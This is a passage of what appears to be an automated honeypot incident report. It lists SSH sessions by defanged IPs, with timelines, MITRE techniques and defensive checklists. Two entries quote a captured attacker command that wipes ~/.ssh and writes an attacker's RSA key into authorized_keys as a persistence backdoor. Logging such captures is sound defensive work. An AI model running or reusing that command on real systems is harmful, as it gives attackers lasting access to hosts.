- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ae45b5681b6

| Field | Detail |
|---|---|
| **Source IP** | `202.51.214[.]98` |
| **First Seen** | 2026-08-04 14:29 |
| **Last Seen** | 2026-08-04 14:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:29:06` | `cowrie.session.connect` |
| `2026-08-04 14:29:06` | `cowrie.client.version` |
| `2026-08-04 14:29:07` | `cowrie.client.kex` |
| `2026-08-04 14:29:08` | `cowrie.login.success` |
| `2026-08-04 14:29:09` | `cowrie.session.params` |
| `2026-08-04 14:29:09` | `cowrie.command.input` |
| `2026-08-04 14:29:09` | `cowrie.command.failed` |
| `2026-08-04 14:29:09` | `cowrie.log.closed` |
| `2026-08-04 14:29:10` | `cowrie.session.params` |
| `2026-08-04 14:29:10` | `cowrie.command.input` |
| `2026-08-04 14:29:11` | `cowrie.session.file_download` |
| `2026-08-04 14:29:11` | `cowrie.log.closed` |
| `2026-08-04 14:29:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.51.214[.]98` to AbuseIPDB if not already reported
- [ ] Block `202.51.214[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b393dbe50ec

| Field | Detail |
|---|---|
| **Source IP** | `202.51.214[.]98` |
| **First Seen** | 2026-08-04 14:29 |
| **Last Seen** | 2026-08-04 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:29:11` | `cowrie.session.connect` |
| `2026-08-04 14:29:11` | `cowrie.client.version` |
| `2026-08-04 14:29:11` | `cowrie.client.kex` |
| `2026-08-04 14:29:12` | `cowrie.login.success` |
| `2026-08-04 14:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.51.214[.]98` to AbuseIPDB if not already reported
- [ ] Block `202.51.214[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-568ad6bbe874

| Field | Detail |
|---|---|
| **Source IP** | `202.51.214[.]98` |
| **First Seen** | 2026-08-04 14:29 |
| **Last Seen** | 2026-08-04 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:29:13` | `cowrie.session.connect` |
| `2026-08-04 14:29:13` | `cowrie.client.version` |
| `2026-08-04 14:29:13` | `cowrie.client.kex` |
| `2026-08-04 14:29:14` | `cowrie.login.success` |
| `2026-08-04 14:29:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.51.214[.]98` to AbuseIPDB if not already reported
- [ ] Block `202.51.214[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced087329a4e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:29 |
| **Last Seen** | 2026-08-04 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:29:41` | `cowrie.session.connect` |
| `2026-08-04 14:29:41` | `cowrie.client.version` |
| `2026-08-04 14:29:41` | `cowrie.client.kex` |
| `2026-08-04 14:29:41` | `cowrie.login.success` |
| `2026-08-04 14:29:42` | `cowrie.session.params` |
| `2026-08-04 14:29:42` | `cowrie.command.input` |
| `2026-08-04 14:29:42` | `cowrie.log.closed` |
| `2026-08-04 14:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35c278fd4539

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:31 |
| **Last Seen** | 2026-08-04 14:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:31:27` | `cowrie.session.connect` |
| `2026-08-04 14:31:27` | `cowrie.client.version` |
| `2026-08-04 14:31:27` | `cowrie.client.kex` |
| `2026-08-04 14:31:27` | `cowrie.login.success` |
| `2026-08-04 14:31:28` | `cowrie.session.params` |
| `2026-08-04 14:31:28` | `cowrie.command.input` |
| `2026-08-04 14:31:28` | `cowrie.log.closed` |
| `2026-08-04 14:31:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15f8f4257202

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:33 |
| **Last Seen** | 2026-08-04 14:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:33:14` | `cowrie.session.connect` |
| `2026-08-04 14:33:14` | `cowrie.client.version` |
| `2026-08-04 14:33:14` | `cowrie.client.kex` |
| `2026-08-04 14:33:15` | `cowrie.login.success` |
| `2026-08-04 14:33:16` | `cowrie.session.params` |
| `2026-08-04 14:33:16` | `cowrie.command.input` |
| `2026-08-04 14:33:16` | `cowrie.log.closed` |
| `2026-08-04 14:33:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9715c119e41b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:34 |
| **Last Seen** | 2026-08-04 14:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:34:59` | `cowrie.session.connect` |
| `2026-08-04 14:34:59` | `cowrie.client.version` |
| `2026-08-04 14:34:59` | `cowrie.client.kex` |
| `2026-08-04 14:35:00` | `cowrie.login.success` |
| `2026-08-04 14:35:00` | `cowrie.session.params` |
| `2026-08-04 14:35:00` | `cowrie.command.input` |
| `2026-08-04 14:35:00` | `cowrie.log.closed` |
| `2026-08-04 14:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b243cae690fa

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:36 |
| **Last Seen** | 2026-08-04 14:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:36:46` | `cowrie.session.connect` |
| `2026-08-04 14:36:46` | `cowrie.client.version` |
| `2026-08-04 14:36:46` | `cowrie.client.kex` |
| `2026-08-04 14:36:47` | `cowrie.login.success` |
| `2026-08-04 14:36:48` | `cowrie.session.params` |
| `2026-08-04 14:36:48` | `cowrie.command.input` |
| `2026-08-04 14:36:48` | `cowrie.log.closed` |
| `2026-08-04 14:36:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1157eaf4ce61

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:38 |
| **Last Seen** | 2026-08-04 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:38:32` | `cowrie.session.connect` |
| `2026-08-04 14:38:32` | `cowrie.client.version` |
| `2026-08-04 14:38:32` | `cowrie.client.kex` |
| `2026-08-04 14:38:32` | `cowrie.login.success` |
| `2026-08-04 14:38:33` | `cowrie.session.params` |
| `2026-08-04 14:38:33` | `cowrie.command.input` |
| `2026-08-04 14:38:33` | `cowrie.log.closed` |
| `2026-08-04 14:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4f82ebb9b31

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:40 |
| **Last Seen** | 2026-08-04 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:40:12` | `cowrie.session.connect` |
| `2026-08-04 14:40:12` | `cowrie.client.version` |
| `2026-08-04 14:40:12` | `cowrie.client.kex` |
| `2026-08-04 14:40:12` | `cowrie.login.success` |
| `2026-08-04 14:40:13` | `cowrie.session.params` |
| `2026-08-04 14:40:13` | `cowrie.command.input` |
| `2026-08-04 14:40:13` | `cowrie.log.closed` |
| `2026-08-04 14:40:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abce1a96f549

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:41 |
| **Last Seen** | 2026-08-04 14:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:41:52` | `cowrie.session.connect` |
| `2026-08-04 14:41:52` | `cowrie.client.version` |
| `2026-08-04 14:41:52` | `cowrie.client.kex` |
| `2026-08-04 14:41:52` | `cowrie.login.success` |
| `2026-08-04 14:41:53` | `cowrie.session.params` |
| `2026-08-04 14:41:53` | `cowrie.command.input` |
| `2026-08-04 14:41:53` | `cowrie.log.closed` |
| `2026-08-04 14:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba37a0f5740f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:43 |
| **Last Seen** | 2026-08-04 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:43:37` | `cowrie.session.connect` |
| `2026-08-04 14:43:37` | `cowrie.client.version` |
| `2026-08-04 14:43:37` | `cowrie.client.kex` |
| `2026-08-04 14:43:37` | `cowrie.login.success` |
| `2026-08-04 14:43:38` | `cowrie.session.params` |
| `2026-08-04 14:43:38` | `cowrie.command.input` |
| `2026-08-04 14:43:38` | `cowrie.log.closed` |
| `2026-08-04 14:43:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bc936d1e904

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]231` |
| **First Seen** | 2026-08-04 14:43 |
| **Last Seen** | 2026-08-04 14:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:43:53` | `cowrie.session.connect` |
| `2026-08-04 14:43:53` | `cowrie.client.version` |
| `2026-08-04 14:43:53` | `cowrie.client.kex` |
| `2026-08-04 14:43:54` | `cowrie.login.success` |
| `2026-08-04 14:43:54` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:43:54` | `cowrie.direct-tcpip.data` |
| `2026-08-04 14:43:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]231` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-596c5ce56fe8

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:45 |
| **Last Seen** | 2026-08-04 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:45:24` | `cowrie.session.connect` |
| `2026-08-04 14:45:24` | `cowrie.client.version` |
| `2026-08-04 14:45:24` | `cowrie.client.kex` |
| `2026-08-04 14:45:24` | `cowrie.login.success` |
| `2026-08-04 14:45:25` | `cowrie.session.params` |
| `2026-08-04 14:45:25` | `cowrie.command.input` |
| `2026-08-04 14:45:25` | `cowrie.log.closed` |
| `2026-08-04 14:45:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2984018dae0

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:47 |
| **Last Seen** | 2026-08-04 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:47:09` | `cowrie.session.connect` |
| `2026-08-04 14:47:09` | `cowrie.client.version` |
| `2026-08-04 14:47:09` | `cowrie.client.kex` |
| `2026-08-04 14:47:09` | `cowrie.login.success` |
| `2026-08-04 14:47:10` | `cowrie.session.params` |
| `2026-08-04 14:47:10` | `cowrie.command.input` |
| `2026-08-04 14:47:10` | `cowrie.log.closed` |
| `2026-08-04 14:47:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c5d0980a455

| Field | Detail |
|---|---|
| **Source IP** | `115.241.228[.]34` |
| **First Seen** | 2026-08-04 14:48 |
| **Last Seen** | 2026-08-04 14:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:48:07` | `cowrie.session.connect` |
| `2026-08-04 14:48:07` | `cowrie.client.version` |
| `2026-08-04 14:48:07` | `cowrie.client.kex` |
| `2026-08-04 14:48:10` | `cowrie.login.success` |
| `2026-08-04 14:48:10` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.228[.]34` to AbuseIPDB if not already reported
- [ ] Block `115.241.228[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1449c467141b

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]55` |
| **First Seen** | 2026-08-04 14:48 |
| **Last Seen** | 2026-08-04 14:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:48:15` | `cowrie.session.connect` |
| `2026-08-04 14:48:16` | `cowrie.client.version` |
| `2026-08-04 14:48:16` | `cowrie.client.kex` |
| `2026-08-04 14:48:17` | `cowrie.login.success` |
| `2026-08-04 14:48:18` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]55` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1beb4de4a31

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:48 |
| **Last Seen** | 2026-08-04 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:48:57` | `cowrie.session.connect` |
| `2026-08-04 14:48:57` | `cowrie.client.version` |
| `2026-08-04 14:48:57` | `cowrie.client.kex` |
| `2026-08-04 14:48:57` | `cowrie.login.success` |
| `2026-08-04 14:48:58` | `cowrie.session.params` |
| `2026-08-04 14:48:58` | `cowrie.command.input` |
| `2026-08-04 14:48:58` | `cowrie.log.closed` |
| `2026-08-04 14:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-823de188f378

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 14:50 |
| **Last Seen** | 2026-08-04 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:50:46` | `cowrie.session.connect` |
| `2026-08-04 14:50:46` | `cowrie.client.version` |
| `2026-08-04 14:50:46` | `cowrie.client.kex` |
| `2026-08-04 14:50:46` | `cowrie.login.success` |
| `2026-08-04 14:50:47` | `cowrie.session.params` |
| `2026-08-04 14:50:47` | `cowrie.command.input` |
| `2026-08-04 14:50:47` | `cowrie.log.closed` |
| `2026-08-04 14:50:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ac9a3f94b32

| Field | Detail |
|---|---|
| **Source IP** | `94.26.106[.]33` |
| **First Seen** | 2026-08-04 14:50 |
| **Last Seen** | 2026-08-04 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:50:59` | `cowrie.session.connect` |
| `2026-08-04 14:50:59` | `cowrie.client.version` |
| `2026-08-04 14:50:59` | `cowrie.client.kex` |
| `2026-08-04 14:51:00` | `cowrie.login.success` |
| `2026-08-04 14:51:00` | `cowrie.direct-tcpip.request` |
| `2026-08-04 14:51:00` | `cowrie.direct-tcpip.data` |
| `2026-08-04 14:51:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.26.106[.]33` to AbuseIPDB if not already reported
- [ ] Block `94.26.106[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ab11389f99b

| Field | Detail |
|---|---|
| **Source IP** | `107.173.155[.]92` |
| **First Seen** | 2026-08-04 14:51 |
| **Last Seen** | 2026-08-04 14:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:51:30` | `cowrie.session.connect` |
| `2026-08-04 14:51:30` | `cowrie.client.version` |
| `2026-08-04 14:51:30` | `cowrie.client.kex` |
| `2026-08-04 14:51:30` | `cowrie.login.success` |
| `2026-08-04 14:51:31` | `cowrie.session.params` |
| `2026-08-04 14:51:31` | `cowrie.command.input` |
| `2026-08-04 14:51:31` | `cowrie.command.failed` |
| `2026-08-04 14:51:31` | `cowrie.log.closed` |
| `2026-08-04 14:51:32` | `cowrie.session.params` |
| `2026-08-04 14:51:32` | `cowrie.command.input` |
| `2026-08-04 14:51:32` | `cowrie.session.file_download` |
| `2026-08-04 14:51:32` | `cowrie.log.closed` |
| `2026-08-04 14:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.155[.]92` to AbuseIPDB if not already reported
- [ ] Block `107.173.155[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b4ee74b1b26

| Field | Detail |
|---|---|
| **Source IP** | `107.173.155[.]92` |
| **First Seen** | 2026-08-04 14:51 |
| **Last Seen** | 2026-08-04 14:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:51:32` | `cowrie.session.connect` |
| `2026-08-04 14:51:32` | `cowrie.client.version` |
| `2026-08-04 14:51:32` | `cowrie.client.kex` |
| `2026-08-04 14:51:33` | `cowrie.login.success` |
| `2026-08-04 14:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.155[.]92` to AbuseIPDB if not already reported
- [ ] Block `107.173.155[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecd338127cd5

| Field | Detail |
|---|---|
| **Source IP** | `107.173.155[.]92` |
| **First Seen** | 2026-08-04 14:51 |
| **Last Seen** | 2026-08-04 14:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 14:51:33` | `cowrie.session.connect` |
| `2026-08-04 14:51:33` | `cowrie.client.version` |
| `2026-08-04 14:51:33` | `cowrie.client.kex` |
| `2026-08-04 14:51:33` | `cowrie.login.success` |
| `2026-08-04 14:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.155[.]92` to AbuseIPDB if not already reported
- [ ] Block `107.173.155[.]92` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bbc1afc4210

| Field | Detail |
|---|---|
| **Source IP** | `20.102.69[.]233` |
| **First Seen** | 2026-08-04 14:51 |
| **Last Seen** | 2026-08-04 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
